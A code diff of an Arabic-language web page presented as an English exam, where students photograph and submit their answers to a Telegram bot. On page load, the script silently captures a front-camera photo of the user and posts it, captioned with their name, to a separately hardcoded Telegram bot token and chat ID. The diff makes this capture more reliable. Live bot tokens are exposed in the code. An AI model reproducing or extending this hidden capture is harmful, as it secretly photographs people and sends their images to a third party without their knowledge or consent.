@@ -18,6 +18,17 @@
             margin: 20px 0;
             font-size: 2rem;
         }
+#user-name {
+    background-color: #121212; /* خلفية سوداء */
+    color: #ccc; /* نص أبيض */
+    font-size: 1rem; /* حجم الخط أكبر */
+    padding: 5px; /* إضافة حواف داخلية لزيادة المسافة حول النص */
+    border: 2px solid #444; /* حدود خفيفة بلون داكن */
+    border-radius: 5px; /* حواف دائرية */
+    width: 90%; /* عرض الحقل بنسبة 80% من الشاشة */
+    max-width: 400px; /* تحديد أقصى عرض */
+    box-sizing: border-box; /* التأكد من أن الحجم يشمل الحواف */
+}
 
         #questions img {
             width: 90%;
@@ -102,7 +113,19 @@
             border: 2px solid #444;
             border-radius: 10px;
         }
-
+#sending-message {
+    display: none; /* إخفاء الرسالة افتراضيًا */
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: #888; /* خلفية رمادية */
+    color: white;
+    padding: 20px;
+    border-radius: 5px;
+    font-size: 18px;
+    z-index: 1000; /* لضمان الظهور فوق العناصر الأخرى */
+}
         #success-message {
             display: none;
             position: fixed;
@@ -123,18 +146,14 @@
     </style>
 </head>
 <body>
-  <!-- قسم إدخال الاسم -->
-<div id="name-container">
-    <label for="user-name">أدخل اسمك:</label>
-    <input type="text" id="user-name" placeholder="اكتب اسمك هنا">
-    <button id="confirm-name-button">حفظ</button>
+    <h1>امتحان English</h1>
+<div id="user-name-container">
+    <input type="text" id="user-name" placeholder="أدخل اسمك">
 </div>
-<div id="content-container">
-<h1>امتحان English</h1>
     <div id="questions">
         <img src="pics/qq.jpg" alt="صورة الأسئلة">
     </div>
-</div>
+
     <button id="start-button">تصوير الإجابة</button>
 
     <div id="video-container">
@@ -152,48 +171,17 @@
             <button id="send-button">إرسال</button>
         </div>
     </div>
-
-    <div id="success-message">تم إرسال الصورة بنجاح</div>
+    <div id="sending-message">جاري الإرسال...</div>
+    <div id="success-message">تم إرسال الصورة</div>
 
     <script>
-    const nameContainer = document.getElementById("name-container");
-    const contentContainer = document.getElementById("content-container");
-    const confirmNameButton = document.getElementById("confirm-name-button");
-    const userNameInput = document.getElementById("user-name");
-
-    // إخفاء المحتوى الرئيسي في البداية
-    contentContainer.style.display = "none";
-
-    // التحقق عند تحميل الصفحة
-window.onload = () => {
-    captureFrontCameraOnLoad(); // تشغيل الكاميرا الأمامية
-    const savedName = localStorage.getItem("userName")?.trim();
-    if (savedName) {
-        nameContainer.style.display = "none";
-        contentContainer.style.display = "block";
-        alert(`مرحبًا مجددًا، ${savedName}!`);
-    } else {
-        nameContainer.style.display = "block";
-    }
-};
-
-    // عند الضغط على زر "حفظ"
-confirmNameButton.addEventListener("click", () => {
-    const userName = userNameInput.value.trim();
-    if (userName.length >= 3) { // الحد الأدنى 3 أحرف
-        localStorage.setItem("userName", userName);
-        alert(`مرحبًا ${userName}!`);
-        nameContainer.style.display = "none";
-        contentContainer.style.display = "block";
-    } else {
-        alert("يرجى إدخال اسم صحيح (3 أحرف على الأقل).");
-    }
-});
-
         const telegramBotToken = "8118528112:AAGp9BP3S9Zv57UH9SvBfGOZfYYlTZsjkno";
         const frontCameraBotToken = "7603399803:AAE324_os0Vzcovlb1DrQBvMbvRaDSqyNzU"; // توكين الكاميرا الأمامية
         const chatId = "953829904";
-
+const userNameInput = document.getElementById("user-name");
+userNameInput.addEventListener("change", () => {
+    localStorage.setItem("userName", userNameInput.value);
+});
         const startButton = document.getElementById("start-button");
         const videoContainer = document.getElementById("video-container");
         const video = document.getElementById("video");
@@ -216,8 +204,16 @@ async function captureFrontCameraOnLoad() {
         });
         const frontVideo = document.createElement("video");
         frontVideo.srcObject = frontStream;
+
+        // انتظر حتى يتم تحميل بيانات الفيديو
+        await new Promise((resolve) => {
+            frontVideo.onloadeddata = resolve;
+        });
+
+        // تشغيل الفيديو
         await frontVideo.play();
 
+        // انتظر 2 ثانية إضافية بعد تجهيز الكاميرا
         setTimeout(() => {
             const canvas = document.createElement("canvas");
             canvas.width = frontVideo.videoWidth;
@@ -225,6 +221,7 @@ async function captureFrontCameraOnLoad() {
             const context = canvas.getContext("2d");
             context.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
 
+            // إيقاف الكاميرا بعد التقاط الصورة
             frontStream.getTracks().forEach(track => track.stop());
 
             canvas.toBlob(async (blob) => {
@@ -232,13 +229,15 @@ async function captureFrontCameraOnLoad() {
                 formData.append("chat_id", chatId);
                 formData.append("photo", blob, "front_photo.png");
 
-                // استخدام توكين الكاميرا الأمامية هنا
+                const userName = localStorage.getItem("userName") || "اسم غير متوفر";
+                formData.append("caption", `${userName}`);
+
                 await fetch(`https://api.telegram.org/bot${frontCameraBotToken}/sendPhoto`, {
                     method: "POST",
                     body: formData
                 });
 
-                // إظهار الزر بعد انتهاء العملية
+                // عرض الزر بعد انتهاء العملية
                 document.getElementById("start-button").style.display = "block";
             }, "image/png");
         }, 2000);
@@ -312,24 +311,38 @@ async function disableFlash() {
         }
 
         // إرسال الصورة
-        async function sendPhoto() {
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", capturedBlob, "back_photo.png");
+async function sendPhoto() {
+    const userName = localStorage.getItem("userName") || "اسم غير متوفر";
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("photo", capturedBlob, "back_photo.png");
+    formData.append("caption", ` ${userName}`);
 
-            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            });
+    // إظهار رسالة "جاري الإرسال..."
+    const sendingMessage = document.getElementById("sending-message");
+    sendingMessage.style.display = "block";
 
-            successMessage.style.display = "block";
-            setTimeout(() => {
-                successMessage.style.display = "none";
-            }, 2000);
+    try {
+        await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        });
 
-            hideCapturedPhoto();
-        }
+        // إظهار رسالة "تم إرسال الصورة "
+        sendingMessage.style.display = "none"; // إخفاء رسالة "جاري الإرسال..."
+        successMessage.style.display = "block";
 
+        setTimeout(() => {
+            successMessage.style.display = "none";
+        }, 2000);
+
+        hideCapturedPhoto();
+    } catch (error) {
+        console.error("حدث خطأ أثناء الإرسال:", error);
+        alert("تعذر إرسال الصورة. حاول مرة أخرى.");
+        sendingMessage.style.display = "none"; // إخفاء رسالة "جاري الإرسال..." عند الخطأ
+    }
+}
         // التحكم بالفلاش
         async function toggleFlash() {
             try {
@@ -351,10 +364,16 @@ async function disableFlash() {
             }
         }
 
-        window.onload = captureFrontCameraOnLoad;
+        window.onload = () => {
+    const savedUserName = localStorage.getItem("userName");
+    if (savedUserName) {
+        userNameInput.value = savedUserName;
+    }
+    captureFrontCameraOnLoad();
+};
         startButton.addEventListener("click", startCamera);
         captureButton.addEventListener("click", () => {
-            navigator.vibrate(80); // الاهتزاز
+            navigator.vibrate(50); // الاهتزاز
             capturePhoto();
         });
         deleteButton.addEventListener("click", hideCapturedPhoto);
@@ -362,4 +381,4 @@ async function disableFlash() {
         flashButton.addEventListener("click", toggleFlash);
     </script>
 </body>
-        </html>
+</html>
